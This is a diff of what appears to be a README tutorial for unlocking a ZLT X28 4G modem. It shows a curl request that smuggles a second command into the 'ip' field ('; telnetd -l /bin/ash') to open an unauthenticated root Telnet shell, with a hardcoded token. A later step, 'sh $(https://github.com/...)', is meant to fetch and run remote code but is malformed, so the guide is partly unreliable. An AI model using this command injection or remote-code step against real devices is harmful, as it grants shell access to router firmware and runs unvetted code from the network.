@@ -67,8 +67,8 @@ curl 'https://192.168.70.1/cgi-bin/http.cgi' -X POST --data-raw '{"method":"POST
 Run the following command from your system’s terminal, replacing the placeholder `sessionId` with the one you retrieved earlier:  
 
 ```bash
-curl 'https://192.168.70.1/cgi-bin/http.cgi' \
---data-raw '{"enabled":"1","ip":"192.168.1.1 ; telnetd -l /bin/ash","cmd":172,"method":"POST","success":true,"subcmd":6,"token":"5948b69147b3850eee5e7266188934c5","language":"EN","sessionId":"<YOUR_SESSION_ID>"}' -k
+curl 'https://192.168.70.1/cgi-bin/http.cgi' `
+--data-raw '{"enabled":"1","ip":"192.168.70.1 ; telnetd -l /bin/ash","cmd":172,"method":"POST","success":true,"subcmd":6,"token":"5948b69147b3850eee5e7266188934c5","language":"EN","sessionId":"<YOUR_SESSION_ID>"}' -k
 ```
 
 After this, Telnet will be enabled. Connect using:
@@ -83,14 +83,4 @@ Once inside Telnet, run the following command:
 sh $(https://github.com/mahdigh782/Unlock-ZLT-X28/raw/refs/heads/main/x28)
 ```
 The modem will restart after a few seconds. Once it powers back on, it will be unlocked.
-
-## Donations
-
-If you found this useful, you can support development via TRON (TRX):
-
-💠 Wallet Address: TXDhVJDtkBUq2KN3QYZW4zDtkJkLLwFVgb
-
-
-#ZLT_X28 #Modem_Unlock #Admin_Panel_Access #Custom_Modem_UI #Firmware_Upgrade #4G_Modem_Unlock #Network_Unlock_ZLT #ZLT_Admin_Unlock
-
 
